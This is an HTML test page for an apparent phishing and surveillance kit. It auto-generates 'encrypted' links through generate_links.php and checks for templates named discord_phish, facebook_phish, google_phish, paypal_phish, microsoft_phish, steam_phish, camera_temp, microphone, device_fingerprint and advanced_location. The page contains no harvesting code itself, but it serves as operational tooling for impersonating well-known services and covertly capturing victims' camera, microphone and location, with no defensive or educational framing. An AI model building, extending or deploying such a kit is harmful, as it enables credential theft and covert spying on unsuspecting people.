<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test Encryption System</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .test-container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 600px;
            width: 100%;
        }
        h1 {
            color: #667eea;
            margin-bottom: 30px;
        }
        .test-result {
            margin: 20px 0;
            padding: 15px;
            border-radius: 10px;
            background: #f8f9fa;
        }
        .success { border-left: 4px solid #2ecc71; }
        .error { border-left: 4px solid #e74c3c; }
        .info { border-left: 4px solid #3498db; }
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 10px;
            cursor: pointer;
            font-weight: 600;
            margin: 10px 5px;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }
        code {
            background: #2c3e50;
            color: #2ecc71;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="test-container">
        <h1>🧪 Encryption System Test</h1>
        
        <div id="results"></div>
        
        <button onclick="testEncryption()">Test Encryption</button>
        <button onclick="testTemplates()">Test Templates</button>
        <button onclick="window.location.href='template-selector.php'">Go to Template Selector</button>
    </div>

    <script>
        function addResult(type, title, message) {
            const results = document.getElementById('results');
            const div = document.createElement('div');
            div.className = `test-result ${type}`;
            div.innerHTML = `<strong>${title}</strong><br>${message}`;
            results.appendChild(div);
        }

        function testEncryption() {
            document.getElementById('results').innerHTML = '';
            
            addResult('info', '🔍 Testing...', 'Checking encryption system...');
            
            fetch('generate_links.php')
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        addResult('success', '✅ Encryption Working!', 
                            `Successfully generated ${Object.keys(data.templates).length} encrypted links`);
                        
                        // Test one link
                        const firstKey = Object.keys(data.templates)[0];
                        const firstTemplate = data.templates[firstKey];
                        addResult('info', '📋 Sample Link', 
                            `<strong>${firstTemplate.name}</strong><br>` +
                            `<code>${firstTemplate.url}</code>`);
                    } else {
                        addResult('error', '❌ Error', 'Failed to generate links');
                    }
                })
                .catch(error => {
                    addResult('error', '❌ Connection Error', error.message);
                });
        }

        function testTemplates() {
            document.getElementById('results').innerHTML = '';
            
            const templates = [
                'advanced_location', 'camera_temp', 'device_fingerprint',
                'discord_phish', 'facebook_phish', 'google_phish',
                'microphone', 'microsoft_phish', 'nearyou',
                'netflix_phish', 'normal_data', 'paypal_phish',
                'spotify_phish', 'steam_phish', 'twitter_phish', 'weather'
            ];
            
            addResult('info', '🔍 Checking Templates...', 'Verifying template directories...');
            
            let foundCount = 0;
            templates.forEach(template => {
                fetch(`templates/${template}/index.html`, { method: 'HEAD' })
                    .then(response => {
                        if (response.ok) {
                            foundCount++;
                            addResult('success', `✅ ${template}`, 'Template found and accessible');
                        } else {
                            addResult('error', `❌ ${template}`, 'Template not found');
                        }
                    })
                    .catch(() => {
                        addResult('error', `❌ ${template}`, 'Connection error');
                    });
            });
            
            setTimeout(() => {
                addResult('info', '📊 Summary', 
                    `Found ${foundCount} out of ${templates.length} templates`);
            }, 2000);
        }

        // Auto-run test on load
        window.onload = () => {
            setTimeout(testEncryption, 500);
        };
    </script>
</body>
</html>
